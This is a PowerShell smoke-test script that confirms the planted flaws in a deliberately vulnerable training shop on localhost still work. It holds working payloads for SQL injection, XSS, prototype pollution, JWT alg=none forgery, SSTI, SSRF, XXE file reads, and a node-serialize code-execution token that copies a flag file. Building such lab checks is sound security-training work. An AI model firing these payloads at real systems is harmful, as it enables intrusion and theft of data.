# smoke-test.ps1 - vulnerability checklist against running vuln-shop.
param([string]$Base = 'http://127.0.0.1:3002')

$ErrorActionPreference = 'Continue'
$script:pass = 0
$script:fail = 0

function Check {
    param([string]$Name, [bool]$Cond, [string]$Detail = '')
    if ($Cond) {
        Write-Host ('  [PASS] ' + $Name) -ForegroundColor Green
        $script:pass++
    } else {
        Write-Host ('  [FAIL] ' + $Name + ' ' + $Detail) -ForegroundColor Red
        $script:fail++
    }
}

function NewSession { New-Object Microsoft.PowerShell.Commands.WebRequestSession }

function Hit {
    param(
        [string]$Method = 'GET',
        [string]$Path,
        $Session = $null,
        [hashtable]$Form = $null,
        [string]$RawBody = $null,
        [string]$ContentType = $null,
        [hashtable]$Headers = $null
    )
    $params = @{
        Uri                = ($Base + $Path)
        Method             = $Method
        UseBasicParsing    = $true
        MaximumRedirection = 0
        ErrorAction        = 'SilentlyContinue'
    }
    if ($Session) { $params['WebSession'] = $Session }
    if ($Headers) { $params['Headers'] = $Headers }
    if ($RawBody) {
        $params['Body'] = $RawBody
        if ($ContentType) { $params['ContentType'] = $ContentType }
    } elseif ($Form) {
        $params['Body'] = $Form
    }
    try {
        return Invoke-WebRequest @params
    } catch [System.Net.WebException] {
        return $_.Exception.Response
    } catch {
        return $null
    }
}

function ReadBody($resp) {
    if (-not $resp) { return '' }
    if ($resp.Content) { return [string]$resp.Content }
    try {
        $stream = $resp.GetResponseStream()
        $reader = New-Object IO.StreamReader($stream)
        $text = $reader.ReadToEnd()
        $reader.Close()
        return $text
    } catch { return '' }
}

function StatusOf($resp) {
    if (-not $resp) { return 0 }
    if ($resp.StatusCode -is [int]) { return [int]$resp.StatusCode }
    return [int]$resp.StatusCode.value__
}

function LocationOf($resp) {
    if (-not $resp) { return '' }
    if ($resp.Headers -and $resp.Headers.Location) { return [string]$resp.Headers.Location }
    return ''
}

function Login($username, $password) {
    $s = NewSession
    $r = Hit -Method POST -Path '/login' -Session $s -Form @{ username = $username; password = $password; next = '/products' }
    $loc = LocationOf $r
    if (-not $loc -or $loc -notmatch '/products') { return $null }
    return $s
}

Write-Host ''
Write-Host '--- 0 Health ---' -ForegroundColor Cyan
$r = Hit -Path '/'
Check 'GET / redirects (200/302)' ((StatusOf $r) -in 200,301,302)
$r = Hit -Path '/products'
Check 'GET /products 200' ((StatusOf $r) -eq 200)
Check 'Catalog lists Trail Hoodie' ((ReadBody $r) -match 'Trail Hoodie')
$r = Hit -Path '/static/img/products/hoodie.svg'
Check 'Per-product SVG served' ((StatusOf $r) -eq 200 -and (ReadBody $r) -match '<svg')

Write-Host ''
Write-Host '--- 1 Auth / SQLi ---' -ForegroundColor Cyan
$realSession = Login 'olivia.park' 'OliviaP!23'
Check 'Real login olivia.park' ($realSession -ne $null)

$s = NewSession
$r = Hit -Method POST -Path '/login' -Session $s -Form @{ username = "admin' OR '1'='1' --"; password = 'x'; next = '/products' }
Check 'SQLi login auth bypass' ((LocationOf $r) -match '/products')

$adminSession = Login 'admin_kate' 'AdminKate!1'
Check 'Admin login admin_kate' ($adminSession -ne $null)

Write-Host ''
Write-Host '--- 2 Mass-assignment register (role + credits) ---' -ForegroundColor Cyan
$victim = 'mr_' + (Get-Random)
$r = Hit -Method POST -Path '/register' -Form @{
    username = $victim; password = 'x'; email = "$victim@x.test"
    full_name = $victim; address = 'n/a'; role = 'admin'; credits_cents = '99999900'
}
$s = Login $victim 'x'
Check 'Register succeeded' ($s -ne $null)
$r = Hit -Path '/admin' -Session $s
Check 'Mass-assigned admin reaches /admin' ((StatusOf $r) -eq 200 -and (ReadBody $r) -match 'Support|Orders|admin')

Write-Host ''
Write-Host '--- 3 Reflected + Stored + DOM XSS ---' -ForegroundColor Cyan
$r = Hit -Path '/products/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E'
Check 'Reflected XSS payload echoed unescaped' ((ReadBody $r) -match '<script>alert\(1\)</script>')

$xss = '<img src=x onerror="alert(1)">'
$r = Hit -Method POST -Path '/products/1/reviews' -Session $realSession -Form @{ rating = '5'; body = $xss }
$r = Hit -Path '/products/1'
Check 'Stored XSS review rendered raw' ((ReadBody $r) -match 'onerror="alert\(1\)"')

$r = Hit -Path '/static/js/app.js'
Check 'DOM sink innerHTML present' ((ReadBody $r) -match 'innerHTML')

Write-Host ''
Write-Host '--- 4 Price tampering + IDOR cart/order ---' -ForegroundColor Cyan
$r = Hit -Method POST -Path '/cart/add' -Session $realSession -Form @{ product_id = '11'; qty = '1'; price_cents = '1' }
$r = Hit -Path '/cart' -Session $realSession
Check 'Cart accepts $0.01 tent' ((ReadBody $r) -match '0\.01')

# IDOR on another cart id
$other = Login 'samuel.kim' 'samkimsam'
Hit -Method POST -Path '/cart/add' -Session $other -Form @{ product_id = '2'; qty = '1' } | Out-Null
$r = Hit -Path '/cart/2' -Session $realSession
$body = ReadBody $r
Check 'IDOR /cart/2 returns JSON' ((StatusOf $r) -eq 200 -and $body -match '"cart"')

$r = Hit -Path '/orders/3' -Session $realSession
Check 'IDOR /orders/3 (not owner) renders' ((StatusOf $r) -eq 200 -and (ReadBody $r) -match 'order|Order|total')

Write-Host ''
Write-Host '--- 5 Coupon enumeration + checkout race window ---' -ForegroundColor Cyan
$r = Hit -Method POST -Path '/checkout/apply-coupon' -Session $realSession -Form @{ code = 'STAFF50' }
$good = ReadBody $r
Check 'Known coupon -> 200 + percent_off' ((StatusOf $r) -eq 200 -and $good -match 'percent_off')

$r = Hit -Method POST -Path '/checkout/apply-coupon' -Session $realSession -Form @{ code = 'DOESNOTEXIST' }
Check 'Unknown coupon -> 404 (enumerable)' ((StatusOf $r) -eq 404)

Write-Host ''
Write-Host '--- 6 Prototype pollution profile ---' -ForegroundColor Cyan
$payload = '{"__proto__":{"isAdmin":true,"freeShipping":true}}'
$r = Hit -Method POST -Path '/profile' -Session $realSession -Form @{ settings = $payload }
$r = Hit -Path '/profile/perks-check' -Session $realSession
$j = ReadBody $r
Check 'Prototype pollution flips isAdmin' ($j -match '"isAdmin":true')
Check 'Prototype pollution flips freeShipping' ($j -match '"freeShipping":true')

Write-Host ''
Write-Host '--- 7 JWT alg=none + BOLA + bulk dump ---' -ForegroundColor Cyan
function B64Url($s) {
    return [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($s)).TrimEnd('=').Replace('+','-').Replace('/','_')
}
$h = B64Url '{"alg":"none","typ":"JWT"}'
$p = B64Url '{"sub":10,"username":"admin_kate","role":"admin"}'
$jwt = "$h.$p."
$r = Hit -Path '/api/me' -Headers @{ Authorization = "Bearer $jwt" }
$body = ReadBody $r
Check 'JWT alg=none accepted on /api/me' ((StatusOf $r) -eq 200 -and $body -match 'admin_kate')

$r = Hit -Path '/api/users/10' -Headers @{ Authorization = "Bearer $jwt" }
Check 'BOLA /api/users/10 dumps any row' ((ReadBody $r) -match 'password_md5')

$r = Hit -Path '/api/v1/users'
$body = ReadBody $r
Check 'GET /api/v1/users (no auth) dumps everyone' ((StatusOf $r) -eq 200 -and $body -match 'password_md5')

$r = Hit -Method POST -Path '/api/graphql' -RawBody '{"query":"{ users { id username role } }"}' -ContentType 'application/json'
$body = ReadBody $r
Check 'GraphQL no-auth users dump' ((StatusOf $r) -eq 200 -and $body -match '"olivia.park"')

Write-Host ''
Write-Host '--- 8 SSTI via /contact -> email-service ---' -ForegroundColor Cyan
$r = Hit -Method POST -Path '/contact' -Session $realSession -Form @{ name='qa'; email='qa@x'; subject='{{7*7}}'; body='hi' }
$body = ReadBody $r
Check 'SSTI {{7*7}} evaluates to 49' ($body -match '\b49\b')

Write-Host ''
Write-Host '--- 9 SSRF + XXE + open redirect ---' -ForegroundColor Cyan
$r = Hit -Path '/proxy/image?u=http://127.0.0.1:3002/debug'
$body = ReadBody $r
Check 'SSRF /proxy/image reaches internal /debug' ((StatusOf $r) -eq 200 -and $body -match '"versions"')

$xmlLin = "<!DOCTYPE r [<!ENTITY x SYSTEM `"file:///etc/passwd`">]><r>&x;</r>"
$rLin = Hit -Method POST -Path '/import/xml' -Session $realSession -RawBody $xmlLin -ContentType 'application/xml'
$bodyLin = ReadBody $rLin
$xmlWin = "<!DOCTYPE r [<!ENTITY x SYSTEM `"file:///C:/Windows/win.ini`">]><r>&x;</r>"
$rWin = Hit -Method POST -Path '/import/xml' -Session $realSession -RawBody $xmlWin -ContentType 'application/xml'
$bodyWin = ReadBody $rWin
Check 'XXE leaks host file (linux /etc/passwd or win.ini)' (($bodyLin -match 'root:.*:0:0:' -or $bodyLin -match '/bin/(ba)?sh') -or ($bodyWin -match '\[fonts\]|; for 16-bit app support|extensions'))

$r = Hit -Path '/go?u=https://example.org/x'
Check 'Open redirect /go' ((LocationOf $r) -match 'example.org')

Write-Host ''
Write-Host '--- 10 CORS reflection + cache poisoning + headers ---' -ForegroundColor Cyan
$r = Hit -Path '/api/me' -Headers @{ Origin = 'https://attacker.example'; Authorization = "Bearer $jwt" }
$acao = ''
if ($r -and $r.Headers -and $r.Headers['Access-Control-Allow-Origin']) {
    $acao = [string]$r.Headers['Access-Control-Allow-Origin']
}
Check 'CORS reflects attacker origin' ($acao -eq 'https://attacker.example')

$r = Hit -Path '/admin' -Session $adminSession -Headers @{ 'X-Forwarded-Host' = 'evil.example' }
$link = ''
if ($r -and $r.Headers -and $r.Headers['Link']) { $link = [string]$r.Headers['Link'] }
Check 'X-Forwarded-Host cache poisoning in Link header' ($link -match 'evil.example')

$r = Hit -Path '/debug'
$body = ReadBody $r
Check '/debug exposes env+versions' ((StatusOf $r) -eq 200 -and $body -match '"versions"')

$r = Hit -Path '/static/js/app.js.map'
$body = ReadBody $r
Check 'source map disclosure' ((StatusOf $r) -eq 200 -and $body -match 'sourcesContent')

$r = Hit -Path '/static/js/app.js'
Check 'Secret in JS bundle' ((ReadBody $r) -match 'sk_test_')

Write-Host ''
Write-Host '--- 11 Admin BAC + GET-based privilege escalation ---' -ForegroundColor Cyan
$r = Hit -Path '/admin' -Session $realSession
Check 'Customer can reach /admin (BAC)' ((StatusOf $r) -eq 200 -and (ReadBody $r) -match 'Support|Orders')

# Create throwaway user to promote
$peName = 'pe_' + (Get-Random)
Hit -Method POST -Path '/register' -Form @{ username = $peName; password = 'x'; email="$peName@x"; full_name=$peName } | Out-Null
$peSession = Login $peName 'x'
# Find this user's id via the no-auth /api/v1/users dump (V-SHOP-034)
$r = Hit -Path '/api/v1/users'
$body = ReadBody $r
$newId = 0
foreach ($m in [regex]::Matches($body, '"id":(\d+),"username":"([^"]+)"')) {
    if ($m.Groups[2].Value -eq $peName) { $newId = [int]$m.Groups[1].Value; break }
}
if ($newId -gt 0) {
    $r = Hit -Path "/admin/users/$newId/promote" -Session $realSession
    $r = Hit -Path '/admin' -Session $peSession
    Check 'GET /admin/users/:id/promote escalates' ((StatusOf $r) -eq 200)
} else {
    Check 'GET /admin/users/:id/promote escalates' $false 'could not resolve uid'
}

Write-Host ''
Write-Host '--- 12 SQLi /admin/users dumps password_md5 ---' -ForegroundColor Cyan
$r = Hit -Path "/admin/users?q=%25%27%20OR%20%271%27%3D%271" -Session $realSession
Check 'SQLi /admin/users 200' ((StatusOf $r) -eq 200)

Write-Host ''
Write-Host '--- 13 Insecure deserialization on /cart/import (V-SHOP-100) ---' -ForegroundColor Cyan
# Build the node-serialize IIFE payload and base64 it.
$iife = "_" + '$' + '$' + 'ND_FUNC' + '$' + '$' + "_" + `
        "function(){var fs=require('fs');" + `
        "fs.writeFileSync('data/uploads/leak.txt'," + `
        "fs.readFileSync('data/.deserialize-flag','utf8'));}()"
# node-serialize.serialize emits JSON with the magic string verbatim.
$tokenJson = '{"items":[],"owner_id":1,"rce":"' + ($iife -replace '\\', '\\\\' -replace '"','\"') + '"}'
$tokenB64  = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($tokenJson))
# Remove any stale leak file from a previous run.
$leakPath = Join-Path $PSScriptRoot 'data\uploads\leak.txt'
if (Test-Path $leakPath) { Remove-Item $leakPath -Force }
# A throwaway session is fine.
$dsName = 'ds_' + (Get-Random)
Hit -Method POST -Path '/register' -Form @{ username = $dsName; password = 'x'; email="$dsName@x"; full_name=$dsName } | Out-Null
$dsSession = Login $dsName 'x'
$r = Hit -Method POST -Path '/cart/import' -Session $dsSession -Form @{ token = $tokenB64 }
Check '/cart/import accepts attacker token (200/302)' ((StatusOf $r) -in 200,302)
Start-Sleep -Milliseconds 200
$r = Hit -Path '/uploads/leak.txt'
$body = ReadBody $r
Check 'Flag exfiltrated via /uploads/leak.txt' ($body -match 'AccessibleBBB\{deserialize-node-serialize-rce\}')

Write-Host ''
Write-Host '======================================================'
$color = if ($script:fail -eq 0) { 'Green' } else { 'Yellow' }
Write-Host (' RESULT: {0} passed / {1} failed' -f $script:pass, $script:fail) -ForegroundColor $color
Write-Host '======================================================'
exit $script:fail
